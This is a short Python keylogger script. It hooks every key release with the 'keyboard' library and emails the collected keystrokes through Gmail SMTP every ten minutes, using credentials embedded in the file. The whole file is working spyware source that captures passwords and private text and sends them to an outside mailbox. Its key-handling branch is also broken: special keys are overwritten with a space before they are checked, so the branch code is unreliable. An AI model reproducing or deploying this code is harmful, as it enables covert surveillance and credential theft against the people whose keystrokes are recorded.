import keyboard
import smtplib
from threading import Semaphore, Timer

# The time interval for sending the report, the address and password for mailing the report.
SEND_REPORT_EVERY = 600
EMAIL_ADDRESS = ''
EMAIL_PASSWORD = ''


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ''
        self.semaphore = Semaphore(0)

    def callback(self, event):
        # The keystroke logging function itself (special handlers for problem, event and point).
        name = event.name
        if len(name) > 1:
            name = ' '
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(' ', '_')
                name = f"[{name.upper()}]"
        self.log += name

    def sendmail(self, email, password, message):
        # The function implements the report delivery.
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        # The function of sending a report to the post office if the log isn't empty. Zeroes the log, Timer.
        if self.log:
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ''
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # Starts listening to the keyboard, starts the report, blocks the current stream.
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


# Initializing the class and running the logger.
if __name__ == '__main__':
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()